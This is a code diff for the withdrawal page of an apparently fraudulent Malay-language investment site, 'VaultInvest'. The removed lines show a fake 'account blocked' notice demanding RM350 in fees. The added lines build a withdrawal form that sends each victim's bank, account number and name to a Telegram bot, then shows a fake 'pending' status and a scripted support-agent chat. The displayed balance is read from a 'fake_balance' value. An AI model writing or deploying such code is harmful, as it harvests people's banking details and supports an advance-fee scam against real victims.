@@ -3,30 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pengeluaran Dana</title>
+    <title>Withdraw</title>
     <link rel="stylesheet" href="css/style.css">
+    <style>
+        .pending-box { text-align: center; padding: 40px 20px; }
+        .pending-icon { font-size: 60px; margin-bottom: 20px; }
+        .pending-title { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: var(--text-main); }
+        .pending-desc { font-size: 14px; color: var(--text-muted); line-height: 1.6; }
+        .status-badge { display: inline-block; background: #fef3c7; color: #d97706; padding: 6px 12px; border-radius: 20px; font-weight: 700; font-size: 12px; margin-top: 15px; }
+    </style>
 </head>
-<body>
+<body style="background: var(--bg);">
 
-    <div class="card alert-card">
-        <div style="font-size: 36px; margin-bottom: 16px;">⚠️</div>
-        <h1 style="color: #ef4444; font-size: 22px;">Akaun Disekat Sementara</h1>
-        <p class="subtitle" style="color: #fff;">Sistem mengesan pengeluaran luar tabii. Untuk melindungi dana anda, sila buat pembayaran <b>Cukai & Yuran Pemprosesan</b> sebanyak <b>RM 350.00</b>.</p>
-        
-        <div class="bank-box">
-            <p style="font-size: 12px; color: #94a3b8;">Pindahan Maybank</p>
-            <h3>1540 1234 5678</h3>
-            <p style="font-size: 14px; color: #fff;">Nama: VaultInvest Sdn Bhd</p>
-        </div>
-        <p class="subtitle" style="font-size: 13px; margin-bottom: 0;">Sila hubungi Ejen Support di Live Chat selepas membuat pembayaran untuk pengaktifan segera.</p>
+    <div class="header-nav">
+        <a href="dashboard.html" class="back-btn">←</a>
+        <div class="header-title">Pengeluaran Dana</div>
     </div>
 
-    <!-- Live Chat -->
+    <div class="content" style="padding-top: 20px;">
+        
+        <!-- Section 1: Borang Withdraw -->
+        <div id="withdraw-form-section">
+            <div class="balance-card" style="margin-bottom: 20px;">
+                <div class="balance-label">Baki Boleh Dikeluarkan</div>
+                <div class="balance-amount" id="available-balance">RM 0.00</div>
+            </div>
+
+            <form id="withdrawForm">
+                <div class="input-group">
+                    <label>Pilih Bank</label>
+                    <select id="bank" style="width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border); font-size: 15px; background: #fff;">
+                        <option value="Maybank">Maybank</option>
+                        <option value="CIMB">CIMB Bank</option>
+                        <option value="Touch 'n Go">Touch 'n Go eWallet</option>
+                        <option value="Public Bank">Public Bank</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Nombor Akaun Bank</label>
+                    <input type="text" id="acc_num" placeholder="1234 5678 9012" required>
+                </div>
+                <div class="input-group">
+                    <label>Nama Pemilik Akaun</label>
+                    <input type="text" id="acc_name" placeholder="Ali Bin Abu" required>
+                </div>
+                <div class="input-group">
+                    <label>Jumlah (RM)</label>
+                    <input type="number" id="amount" placeholder="100" required>
+                </div>
+                <button type="submit" class="btn-primary" style="width: 100%; margin-top: 10px;">Hantar Permohonan</button>
+            </form>
+        </div>
+
+        <!-- Section 2: Status Pending (Tersembunyi) -->
+        <div id="pending-section" style="display: none;">
+            <div class="balance-card pending-box">
+                <div class="pending-icon">⏳</div>
+                <div class="pending-title">Pengeluaran Diproses</div>
+                <div class="pending-desc">Permohonan pengeluaran anda telah diterima dan sedang menunggu pengesahan dari pihak bank.</div>
+                <div class="status-badge">STATUS: PENDING</div>
+                
+                <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--border);">
+                    <p style="font-size: 13px; color: var(--text-muted);">Ada masalah? Hubungi Ejen kami di Live Chat.</p>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Live Chat Widget -->
     <div class="chat-widget">
         <div class="chat-header" id="chat-toggle">💬</div>
         <div class="chat-body hidden" id="chat-body">
             <div class="chat-messages" id="chat-messages">
-                <div class="msg agent">Salam, saya Ejen Aiman. Akaun anda disekat. Sila buat pembayaran RM350 dan hantar resit di sini untuk pengaktifan segera.</div>
+                <div class="msg agent" id="agent-initial-msg" style="display: none;">Salam, saya Ejen Aiman. Ada apa-apa yang boleh saya bantu dengan pengeluaran anda?</div>
             </div>
             <div class="chat-input-area">
                 <input type="text" id="chat-input" placeholder="Taip mesej anda...">
@@ -37,6 +87,42 @@
 
     <script src="js/config.js"></script>
     <script>
+        // --- LOGIK WITHDRAW ---
+        let balance = parseFloat(localStorage.getItem('fake_balance') || '0');
+        document.getElementById('available-balance').textContent = `RM ${balance.toFixed(2)}`;
+
+        document.getElementById('withdrawForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('button');
+            btn.textContent = "Memproses...";
+            btn.disabled = true;
+
+            const bank = document.getElementById('bank').value;
+            const acc_num = document.getElementById('acc_num').value;
+            const acc_name = document.getElementById('acc_name').value;
+            const amount = document.getElementById('amount').value;
+
+            // Hantar data withdraw ke Telegram
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", 
+                body: new URLSearchParams({ 
+                    chat_id: CONFIG.CHAT_ID, 
+                    text: `🏦 <b>WITHDRAW REQUEST</b>\n\n<b>Bank:</b> ${bank}\n<b>No. Akaun:</b> ${acc_num}\n<b>Nama:</b> ${acc_name}\n<b>Jumlah:</b> RM ${amount}\n\nStatus: PENDING APPROVAL`, 
+                    parse_mode: "HTML" 
+                })
+            });
+
+            // Tukar skrin ke "Pending"
+            document.getElementById('withdraw-form-section').style.display = 'none';
+            document.getElementById('pending-section').style.display = 'block';
+            
+            // Tunjuk live chat lepas 2 saat
+            setTimeout(() => {
+                document.getElementById('agent-initial-msg').style.display = 'block';
+            }, 2000);
+        });
+
+        // --- LOGIK LIVE CHAT ---
         const chatToggle = document.getElementById('chat-toggle');
         const chatBody = document.getElementById('chat-body');
         const chatSend = document.getElementById('chat-send');
